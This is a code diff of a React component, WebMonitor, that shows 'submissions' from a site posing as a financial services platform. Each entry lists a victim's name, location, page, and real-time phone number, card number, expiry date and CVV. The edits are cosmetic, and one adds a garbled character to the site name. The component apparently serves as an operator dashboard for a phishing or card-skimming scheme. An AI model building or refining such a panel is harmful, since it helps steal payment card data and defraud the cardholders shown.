@@ -58,7 +58,7 @@ const submissionData: UserSubmission[] = [
     status: "processing",
     statusText: "处理中",
     submissionType: "personal_info",
-    websiteName: "金融服务平台",
+    websiteName: "金融服务平��",
     currentPage: "/profile/personal-info",
     userName: "张小明",
     userLocation: "北京市朝阳区",
@@ -250,47 +250,44 @@ export function WebMonitor() {
               </div>
 
               {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
-              <div className="grid grid-cols-6 gap-6 mb-4">
+              <div className="grid grid-cols-6 gap-4 mb-3">
                 <div>
                   <div className="text-xs text-muted-foreground mb-1">卡的类型</div>
-                  <div className="flex items-center gap-1">
-                    {getSubmissionTypeIcon(submission.submissionType)}
-                    <span className="text-sm font-medium">{getSubmissionTypeName(submission.submissionType)}</span>
-                  </div>
+                  <div className="text-sm font-medium">{getSubmissionTypeName(submission.submissionType)}</div>
                 </div>
 
                 <div>
                   <div className="text-xs text-muted-foreground mb-1">手机号</div>
                   <div className="text-sm font-mono">
-                    📱 {submission.realtimeInput?.phone || 'N/A'}
+                    {submission.realtimeInput?.phone || 'N/A'}
                   </div>
                 </div>
 
                 <div>
                   <div className="text-xs text-muted-foreground mb-1">姓名</div>
                   <div className="text-sm font-medium">
-                    👤 {submission.userName}
+                    {submission.userName}
                   </div>
                 </div>
 
                 <div>
                   <div className="text-xs text-muted-foreground mb-1">卡号</div>
                   <div className="text-sm font-mono">
-                    💳 {submission.realtimeInput?.cardNumber || 'N/A'}
+                    {submission.realtimeInput?.cardNumber || 'N/A'}
                   </div>
                 </div>
 
                 <div>
                   <div className="text-xs text-muted-foreground mb-1">有效期</div>
                   <div className="text-sm font-mono">
-                    📅 {submission.realtimeInput?.expiryDate || 'N/A'}
+                    {submission.realtimeInput?.expiryDate || 'N/A'}
                   </div>
                 </div>
 
                 <div>
                   <div className="text-xs text-muted-foreground mb-1">CVV</div>
                   <div className="text-sm font-mono">
-                    🔒 {submission.realtimeInput?.cvv || 'N/A'}
+                    {submission.realtimeInput?.cvv || 'N/A'}
                   </div>
                 </div>
               </div>
